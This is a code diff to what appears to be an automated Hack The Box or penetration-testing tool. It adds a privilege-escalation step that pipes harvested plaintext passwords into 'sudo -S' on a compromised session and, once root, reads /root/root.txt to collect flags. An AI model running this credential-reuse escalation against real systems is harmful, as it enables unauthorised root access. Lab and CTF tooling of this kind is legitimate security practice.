@@ -199,6 +199,43 @@ class FootholdMixin:
                 report.enum_findings.append(
                     EnumFinding(command=f"[발판 privesc 열거] {rc}", phase="privesc",
                                 output=out, ran=True))
+            # ①-b 자격 재사용(매우 흔한 HTB 경로): 수확한 평문 비번을 sudo -S(stdin 비번)로 넣어
+            # 전체권한 sudo 를 시도한다. su 와 달리 sudo -S 는 TTY 없이 파이프 비번이 동작하므로
+            # 비대화형 발판 세션에서 신뢰도가 높다. NT 해시(32-hex)는 평문 비번이 아니라 제외.
+            import re
+            import shlex
+            pws: list[str] = []
+            for c in self.world.creds:
+                if ":" not in c:
+                    continue
+                pw = c.split(":", 1)[1].strip().strip("<>").strip()
+                if pw and not re.fullmatch(r"[0-9a-fA-F]{32}", pw) and pw not in pws:
+                    pws.append(pw)
+            for pw in pws[:5]:
+                if self._goal_reached(report) or self._time_up():
+                    return
+                out = session.run(f"echo {shlex.quote(pw)} | sudo -S -k -p '' id 2>/dev/null")
+                report.enum_findings.append(
+                    EnumFinding(command="[발판 privesc 시도] sudo -S(자격 재사용)",
+                                phase="privesc", output=out, ran=True))
+                if "uid=0(root)" in out:
+                    self.world.raise_access("root")
+                    self.audit.event("privesc_root", via="sudo-password-reuse",
+                                     channel=getattr(session, "kind", "?"))
+                    from . import flag_read as _fr
+                    sudo_sh = f"echo {shlex.quote(pw)} | sudo -S -k -p '' cat /root/root.txt 2>/dev/null"
+                    rootout = session.run(sudo_sh)
+                    for kind, val in _fr.read_flags(session, flag_kind=self.flag_kind).items():
+                        prov = _prov.FlagProvenance(kind, val, "<sudo 자격재사용 후 직독>", "privesc",
+                                                    "exploit-derived", "sudo -S 비번 재사용 root 후 직독")
+                        self._record_flag(report, FlagHit(val, kind, "privesc"), prov)
+                    # root.txt 가 일반 읽기로 안 잡히면 sudo 직독분을 스캔(root 전용 권한일 때)
+                    from .flag import scan as _scan
+                    for hit in _scan(sudo_sh, rootout or "", flag_kind=self.flag_kind):
+                        prov = _prov.FlagProvenance(hit.kind, hit.value, "<sudo 직독>", "privesc",
+                                                    "exploit-derived", "sudo -S 로 root.txt 직독")
+                        self._record_flag(report, FlagHit(hit.value, hit.kind, "privesc"), prov)
+                    return
             # ② 랭킹(HIGH 벡터만)
             corpus = "\n".join(f.output for f in report.enum_findings if f.output)
             vectors = [v for v in analyze_enum(corpus) if v.confidence == "high"]
